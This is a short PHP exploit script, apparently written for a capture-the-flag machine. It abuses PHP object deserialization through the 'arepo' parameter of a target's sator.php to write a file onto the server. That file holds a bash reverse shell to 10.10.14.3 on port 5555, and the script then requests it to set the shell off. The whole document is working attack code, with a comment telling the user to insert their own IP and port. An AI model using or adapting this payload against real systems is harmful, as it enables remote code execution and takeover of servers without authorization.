<?php
class DatabaseExport
{
        public $user_file = 'jopraveen.php';
                                               //Change YOUR IP AND PORT HERE vvvvvvvvv
        public $data = '<?php exec("/bin/bash -c \'bash -i > /dev/tcp/10.10.14.3/5555 0>&1\'"); ?>';
        public function __destruct()
        {
                file_put_contents(__DIR__ . '/' . $this ->user_file, $this->data);
                echo '[EXPLOITED] Check your netcat :D   [FOLLOW JOPRAVEEN]';
        }
}
$url = 'http://10.10.10.223/sator.php?arepo=' . urlencode(serialize(new DatabaseExport));
$response = file_get_contents("$url");
$response = file_get_contents("http://10.10.10.223/jopraveen.php");
?>